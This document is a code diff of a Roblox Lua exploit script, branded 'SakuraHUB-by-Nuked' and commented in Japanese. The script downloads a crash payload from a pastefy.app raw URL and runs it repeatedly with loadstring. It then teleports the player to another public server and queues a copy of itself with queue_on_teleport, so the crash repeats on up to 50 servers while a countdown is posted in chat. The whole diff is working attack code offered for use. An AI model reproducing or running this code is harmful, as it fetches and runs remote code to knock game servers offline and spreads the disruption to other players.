@@ -4579,13 +4579,27 @@ do
     local CRASH_URL = "https://pastefy.app/sPciZuXM/raw"
 
     -- ========================================================================
+    -- HTTP取得用フォールバック（game:HttpGet が使えない環境に対応）
+    -- ========================================================================
+    local function safeHttpGet(url)
+        if type(game.HttpGet) == "function" then
+            return game:HttpGet(url)
+        elseif type(HttpGet) == "function" then
+            return HttpGet(url)
+        elseif type(game.HttpGet) == "function" then
+            return game.HttpGet(game, url)
+        else
+            error("HttpGet is not available in this environment")
+        end
+    end
+
+    -- ========================================================================
     -- チャット送信ヘルパー
     -- ========================================================================
     local function sendChatMessage(message, mode)
         mode = mode or "normal"
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            local textChannels = TextChatService:WaitForChild("TextChannels")
-            local generalChannel = textChannels:WaitForChild("RBXGeneral")
+            local generalChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
             if mode == "system" then
                 generalChannel:DisplaySystemMessage(message)
             else
@@ -4607,7 +4621,7 @@ do
     -- ========================================================================
     local function runCrashScript()
         local ok, err = pcall(function()
-            local scriptContent = game:HttpGet(CRASH_URL)
+            local scriptContent = safeHttpGet(CRASH_URL)
             for i = 1, 35 do
                 pcall(function()
                     loadstring(scriptContent)()
@@ -4627,7 +4641,7 @@ do
                 "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
                 game.PlaceId
             )
-            return HttpService:JSONDecode(game:HttpGet(url))
+            return HttpService:JSONDecode(safeHttpGet(url))
         end)
         if ok and result and result.data then
             local currentJobId = game.JobId
@@ -4641,7 +4655,7 @@ do
     end
 
     -- ========================================================================
-    -- テレポート
+    -- 別サーバーへテレポート
     -- ========================================================================
     local function teleportToAnotherServer()
         local targetJobId = getAnotherServerJobId()
@@ -4675,151 +4689,93 @@ do
     end
 
     -- ========================================================================
-    -- ループ用スクリプト文字列を自己完結で生成（外部URL不使用）
-    -- テレポート先でこの文字列が実行される
+    -- 50回ループ用の自己完結スクリプト文字列を生成
+    -- 外部URLは既存の CRASH_URL のみ使用
     -- ========================================================================
-    local function buildLoopScript(count)
+    local function buildLoopScript(currentCount)
+        local nextCount = currentCount + 1
         return string.format([[
--- SakuraCrashLoop (auto-generated)  count=%d
-local MAX_LOOP = %d
-local CRASH_URL = "%s"
-_G.SakuraCrashLoopCount = %d
-
-if _G.SakuraCrashLoopCount > MAX_LOOP then return end
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-
-local function sendChatMessage(message)
-    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        local generalChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-        pcall(function() generalChannel:SendAsync(message) end)
-    else
-        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        if events then
-            local sayMessageRequest = events:FindFirstChild("SayMessageRequest")
-            if sayMessageRequest then sayMessageRequest:FireServer(message, "All") end
-        end
-    end
-end
-
-local function getAnotherServerJobId()
-    local ok, result = pcall(function()
-        local url = string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
-        return HttpService:JSONDecode(game:HttpGet(url))
-    end)
-    if ok and result and result.data then
-        for _, server in ipairs(result.data) do
-            if server.id and server.id ~= game.JobId then return server.id end
-        end
-    end
-    return nil
-end
-
-local function teleportToAnotherServer()
-    local targetJobId = getAnotherServerJobId()
-    local localPlayer = Players.LocalPlayer
-    if targetJobId then
-        local ok = pcall(function()
-            local opts = Instance.new("TeleportOptions")
-            opts.ServerInstanceId = targetJobId
-            TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
-        end)
-        if ok then return true end
-    end
-    pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
-    return false
-end
-
-local function runCrashScript()
-    local ok, err = pcall(function()
-        local scriptContent = game:HttpGet(CRASH_URL)
-        for i = 1, 35 do
-            pcall(function() loadstring(scriptContent)() end)
-            task.wait(0.1)
-        end
-    end)
-    return ok, err
-end
-
-task.spawn(function()
-    sendChatMessage("SakuraHUB-by-Nuked")
-    task.wait(0.8)
-    sendChatMessage("5") task.wait(1)
-    sendChatMessage("4") task.wait(1)
-    sendChatMessage("3") task.wait(1)
-    sendChatMessage("2") task.wait(1)
-    sendChatMessage("1")
-
-    -- 次のサーバーで実行するスクリプトを予約（自己複製）
-    local nextCount = _G.SakuraCrashLoopCount + 1
-    local selfSrc = game:HttpGet("https://pastefy.app/sPciZuXM/raw")
-    -- 自己複製：queue_on_teleport に同じロジックを再帰的に渡す
-    local nextScript = string.format([[
 _G.SakuraCrashLoopCount = %d
 local MAX_LOOP = %d
 local CRASH_URL = "%s"
 if _G.SakuraCrashLoopCount > MAX_LOOP then return end
+
+local function safeHttpGet(url)
+    if type(game.HttpGet) == "function" then return game:HttpGet(url) end
+    if type(HttpGet) == "function" then return HttpGet(url) end
+    if type(game.HttpGet) == "function" then return game.HttpGet(game, url) end
+    error("HttpGet is not available")
+end
+
 local RS = game:GetService("ReplicatedStorage")
 local TCS = game:GetService("TextChatService")
 local TS = game:GetService("TeleportService")
 local HS = game:GetService("HttpService")
 local PL = game:GetService("Players")
-local function sc(m)
+
+local function sendMsg(m)
     if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
         local gc = TCS:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
         pcall(function() gc:SendAsync(m) end)
+    else
+        local ev = RS:FindFirstChild("DefaultChatSystemChatEvents")
+        if ev then
+            local smr = ev:FindFirstChild("SayMessageRequest")
+            if smr then smr:FireServer(m, "All") end
+        end
     end
 end
-local function gs()
+
+local function getJobId()
     local ok, r = pcall(function()
-        return HS:JSONDecode(game:HttpGet(string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)))
+        local u = string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
+        return HS:JSONDecode(safeHttpGet(u))
     end)
     if ok and r and r.data then
-        for _, s in ipairs(r.data) do if s.id and s.id ~= game.JobId then return s.id end end
+        for _, s in ipairs(r.data) do
+            if s.id and s.id ~= game.JobId then return s.id end
+        end
     end
     return nil
 end
-local function tp()
-    local j = gs()
+
+local function doTeleport()
+    local j = getJobId()
     if j then
-        pcall(function()
+        local ok = pcall(function()
             local o = Instance.new("TeleportOptions")
             o.ServerInstanceId = j
             TS:TeleportAsync(game.PlaceId, {PL.LocalPlayer}, o)
         end)
-    else
-        pcall(function() TS:Teleport(game.PlaceId, PL.LocalPlayer) end)
+        if ok then return end
     end
+    pcall(function() TS:Teleport(game.PlaceId, PL.LocalPlayer) end)
 end
-local function cr()
+
+local function doCrash()
     pcall(function()
-        local c = game:HttpGet(CRASH_URL)
-        for i = 1, 35 do pcall(function() loadstring(c)() end) task.wait(0.1) end
+        local c = safeHttpGet(CRASH_URL)
+        for i = 1, 35 do
+            pcall(function() loadstring(c)() end)
+            task.wait(0.1)
+        end
     end)
 end
+
 task.spawn(function()
-    sc("SakuraHUB-by-Nuked") task.wait(0.8)
-    sc("5") task.wait(1) sc("4") task.wait(1) sc("3") task.wait(1) sc("2") task.wait(1) sc("1")
-    task.spawn(tp)
+    sendMsg("SakuraHUB-by-Nuked")
+    task.wait(0.8)
+    sendMsg("5") task.wait(1)
+    sendMsg("4") task.wait(1)
+    sendMsg("3") task.wait(1)
+    sendMsg("2") task.wait(1)
+    sendMsg("1")
+
+    task.spawn(doTeleport)
     task.wait(0.1)
-    task.spawn(cr)
+    task.spawn(doCrash)
 end)
 ]], nextCount, MAX_LOOP, CRASH_URL)
-    if type(queue_on_teleport) == "function" then
-        pcall(function() queue_on_teleport(nextScript) end)
-    elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
-        pcall(function() syn.queue_on_teleport(nextScript) end)
-    end
-
-    task.spawn(teleportToAnotherServer)
-    task.wait(0.1)
-    task.spawn(function() runCrashScript() end)
-end)
-]], count, MAX_LOOP, CRASH_URL, count)
     end
 
     -- ========================================================================
